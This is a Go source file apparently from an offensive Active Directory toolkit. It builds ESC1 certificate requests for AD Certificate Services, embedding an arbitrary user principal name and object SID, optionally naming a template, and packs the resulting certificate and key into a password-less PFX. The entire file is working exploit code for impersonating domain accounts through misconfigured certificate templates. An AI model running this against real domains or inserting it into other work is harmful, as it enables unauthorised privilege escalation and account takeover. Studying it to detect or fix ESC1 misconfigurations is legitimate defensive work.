package adcs

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"strings"

	"github.com/KKingZero/ARK/pkg/ldapcli"
	"software.sslmate.com/src/go-pkcs12"
)

var (
	oidUPNOtherName   = asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}
	oidNTDSCASecurity = asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2}
	oidNTDSObjectSID  = asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2, 1}
	oidCertificateTpl = asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2}
)

// CSROptions is an ESC1 PKCS#10 (UPN + object SID).
type CSROptions struct {
	UPN      string
	SID      string
	Template string
}

// CertificateRequest is a PKCS#10 + RSA key.
type CertificateRequest struct {
	DER []byte
	PEM string
	Key *rsa.PrivateKey
}

// NewESC1CSR builds a PKCS#10 with SAN UPN and NTDS CA security SID.
func NewESC1CSR(opts CSROptions) (CertificateRequest, error) {
	var out CertificateRequest
	if opts.UPN == "" || opts.SID == "" {
		return out, fmt.Errorf("--upn and --sid required")
	}
	if !strings.Contains(opts.UPN, "@") {
		return out, fmt.Errorf("--upn want user@realm")
	}
	if _, err := ldapcli.EncodeSID(opts.SID); err != nil {
		return out, err
	}
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return out, err
	}
	san, err := marshalUPNSAN(opts.UPN)
	if err != nil {
		return out, err
	}
	sidExt, err := marshalSIDExt(opts.SID)
	if err != nil {
		return out, err
	}
	tpl := &x509.CertificateRequest{
		Subject:            pkix.Name{CommonName: strings.SplitN(opts.UPN, "@", 2)[0]},
		SignatureAlgorithm: x509.SHA256WithRSA,
		ExtraExtensions: []pkix.Extension{
			{Id: oidSAN(), Value: san},
			{Id: oidNTDSCASecurity, Value: sidExt, Critical: false},
		},
	}
	if opts.Template != "" {
		b, err := marshalTemplateName(opts.Template)
		if err != nil {
			return out, err
		}
		tpl.ExtraExtensions = append(tpl.ExtraExtensions, pkix.Extension{Id: oidCertificateTpl, Value: b})
	}
	der, err := x509.CreateCertificateRequest(rand.Reader, tpl, key)
	if err != nil {
		return out, err
	}
	out.DER = der
	out.Key = key
	out.PEM = string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: der}))
	return out, nil
}

func oidSAN() asn1.ObjectIdentifier {
	return asn1.ObjectIdentifier{2, 5, 29, 17}
}

func marshalUPNSAN(upn string) ([]byte, error) {
	// OtherName UPN: [0] SEQUENCE { OID, [0] EXPLICIT UTF8String }
	val, err := asn1.MarshalWithParams(upn, "utf8")
	if err != nil {
		return nil, err
	}
	inner := otherName{
		OID: oidUPNOtherName,
		Value: asn1.RawValue{
			Class:      2,
			Tag:        0,
			IsCompound: true,
			Bytes:      val,
		},
	}
	ob, err := asn1.Marshal(inner)
	if err != nil {
		return nil, err
	}
	// SAN: SEQUENCE OF GeneralName, OtherName is [0] IMPLICIT
	wrapped := asn1.RawValue{Class: 2, Tag: 0, IsCompound: true, Bytes: ob}
	wb, err := asn1.Marshal(wrapped)
	if err != nil {
		return nil, err
	}
	return asn1.Marshal([]asn1.RawValue{{FullBytes: wb}})
}

type otherName struct {
	OID   asn1.ObjectIdentifier
	Value asn1.RawValue `asn1:"tag:0,explicit"`
}

func marshalSIDExt(sid string) ([]byte, error) {
	raw, err := ldapcli.EncodeSID(sid)
	if err != nil {
		return nil, err
	}
	oct, err := asn1.Marshal(raw)
	if err != nil {
		return nil, err
	}
	oidb, err := asn1.Marshal(oidNTDSObjectSID)
	if err != nil {
		return nil, err
	}
	// SEQUENCE { OID, [0] EXPLICIT OCTET STRING }
	ctx := asn1.RawValue{Class: 2, Tag: 0, IsCompound: true, Bytes: oct}
	ctxb, err := asn1.Marshal(ctx)
	if err != nil {
		return nil, err
	}
	seq := append(oidb, ctxb...)
	return asn1.Marshal(asn1.RawValue{Class: 0, Tag: 16, IsCompound: true, Bytes: seq})
}

func marshalTemplateName(name string) ([]byte, error) {
	return asn1.MarshalWithParams(name, "printable")
}

// PackPFX wraps issued cert + key as PKCS#12 (empty password).
func PackPFX(key *rsa.PrivateKey, certDER []byte) ([]byte, error) {
	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("issued cert: %w", err)
	}
	return pkcs12.Legacy.Encode(key, cert, nil, "")
}
